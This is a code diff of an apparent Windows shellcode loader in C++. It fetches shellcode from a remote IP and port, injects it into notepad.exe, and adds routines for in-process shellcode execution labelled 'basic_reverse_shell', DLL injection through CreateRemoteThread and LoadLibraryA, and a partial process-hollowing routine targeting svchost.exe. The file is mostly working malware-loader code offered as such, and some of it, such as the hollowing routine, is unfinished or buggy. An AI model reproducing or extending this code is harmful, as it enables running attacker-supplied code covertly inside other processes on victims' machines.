@@ -1,13 +1,6 @@
-#include <iostream>
-#include<windows.h>
-#include <stdlib.h>
-#include<string>
-#include<openssl/md5.h>
-#include<winhttp.h>
-#include<TlHelp32.h>
-#include<Psapi.h>
+#include "Utility.h"
 
-#pragma comment(lib, "winhttp.lib")
+//#pragma comment(lib, "winhttp.lib")
 typedef std::string string;
 
 struct download_struct {
@@ -43,11 +36,6 @@ void read_file(download_struct &download) {
     rewind(f);
     fread(shellcode, sizeof(char), size, f);
     download.shellcode = shellcode;
-}
-
-LPSTR string_to_lpstr(string s) {
-    LPSTR res = const_cast<char*>(s.c_str());
-    return res;
 }
 
 LPCWSTR s2pw(const string s)
@@ -142,22 +130,8 @@ void download_data(download_struct &download) {
     return ;
 }
 
-int get_len_w(PWCHAR text) {
-    int i = 0;
-    while (text[i] != '\0') {
-        i = i + 1;
-    }
-    return i;
-}
-
-char* convert_pwchar_str(PWCHAR text) {
-    int len = get_len_w(text) + 1;
-    char * res = (char*)malloc(len);
-    wcstombs(res, text, get_len_w(text)+1);
-    return res;
-}
-
 int get_process_id(string procname) {
+    Utility ut;
     PROCESSENTRY32 pe32;
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE) {
@@ -169,7 +143,7 @@ int get_process_id(string procname) {
     while (Process32Next(hProcessSnap, &pe32) == TRUE) {
         HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pe32.th32ProcessID);
         if (hProcess) {
-            char* name = convert_pwchar_str(pe32.szExeFile);
+            char* name = ut.convert_pwchar_str(pe32.szExeFile);
             if (_stricmp(name, procname.c_str())==0) {
                 int pid = pe32.th32ProcessID;
                 CloseHandle(hProcess);
@@ -184,25 +158,27 @@ int get_process_id(string procname) {
     return -1;
 }
 
-void process_injection(download_struct &download) {
-    bool res = false;
+int get_target_pid() {
     string process_name = "notepad.exe";
     int pid = get_process_id(process_name);
     if (pid == -1) {
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
-		ZeroMemory(&si, sizeof(si));
-		si.cb = sizeof(si);
-		ZeroMemory(&pi, sizeof(pi));
-        if (CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi)) {
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+        if (CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi))
             pid = (int)pi.dwProcessId;
-        }
-        else {
-            printf("[!] Error creating the process");
-            return;
-        }
+        else
+            printf("[!] Error creating process");
     }
-    download_data(download);
+    return pid;
+}
+
+void process_injection(download_struct &download) {
+    bool res = false;
+    string process_name = "notepad.exe";
+    int pid = get_target_pid();
     size_t* len = (size_t*)malloc(sizeof(size_t));
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
     LPVOID address = VirtualAllocEx(hProcess, NULL, download.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -215,6 +191,62 @@ void process_injection(download_struct &download) {
     return;
 }
 
+void basic_reverse_shell(download_struct& download) {
+    PVOID address = VirtualAlloc(NULL, download.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy(address, download.shellcode, download.len);
+    PVOID thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)address, NULL, NULL, NULL);
+    WaitForSingleObject(thread, INFINITE);
+    return;
+}
+
+void dll_injection(download_struct download,string dllName) {
+    int pid = get_target_pid();
+    PVOID pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+    PVOID address = VirtualAllocEx(pHandle, NULL, dllName.length(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    bool res = WriteProcessMemory(pHandle, address, dllName.c_str(), dllName.length(), NULL);
+    if (res == false) {
+        printf("[!] Error writing DLL name into remote process");
+        return;
+    }
+    PVOID load_addr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)load_addr, address, 0, NULL);
+    return;
+}
+
+void process_hollowing(download_struct download) {
+	STARTUPINFO si;
+	Utility ut;
+	PROCESS_INFORMATION pi;
+	string name = "C:\\Windows\\System32\\svchost.exe";
+
+	typedef unsigned long(__stdcall* pfnZwQueryInformationProcess)
+		(
+			IN  HANDLE,
+			IN  unsigned int,
+			OUT PVOID,
+			IN  ULONG,
+			OUT PULONG
+			);
+	pfnZwQueryInformationProcess ZwQueryInfoProcess = NULL;
+	HMODULE hNtDll = LoadLibrary(ut.s2pw("ntdll.dll"));
+	ZwQueryInfoProcess = (pfnZwQueryInformationProcess)GetProcAddress(hNtDll, "ZwQueryInformationProcess");
+
+	if (CreateProcess(NULL, ut.string_to_lpwstr(name), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		printf("[!] Error creating process");
+		return;
+	}
+	PROCESS_BASIC_INFORMATION pib;
+	HANDLE hProcess = pi.hProcess;
+	ZwQueryInfoProcess(hProcess, 0, &pib, sizeof(pib), NULL);
+
+	PVOID PointerToPE = pib.PebBaseAddress + 0x10;
+	PVOID addrBuf = (PVOID*)malloc(sizeof(PVOID));
+	ReadProcessMemory(hProcess, PointerToPE, addrBuf, sizeof(addrBuf), NULL);
+
+	PVOID data = (PVOID*)malloc(sizeof(PVOID) * 200);
+	ReadProcessMemory(hProcess, addrBuf, data, sizeof(data), NULL);
+}
+
 int main()
 {
     // Declare the structure
@@ -224,10 +256,15 @@ int main()
     download.port = 80;
     download.isFile = 0;
     download.location = download.ip_address + ":" + std::to_string(download.port);
+    
+    // Download/Load the shellcode into memory
+	download_data(download);
 
     // Process Injection C++
-    process_injection(download);
+    //process_injection(download);
 
+    // Process hollowing C++
+    process_hollowing(download);
 //    int pid = get_process_id("notepad.exe");
     printf("[!] Dissecting the PE executable\n");
     HMODULE base_addr = GetModuleHandleA(NULL); //Contains base address of current application.
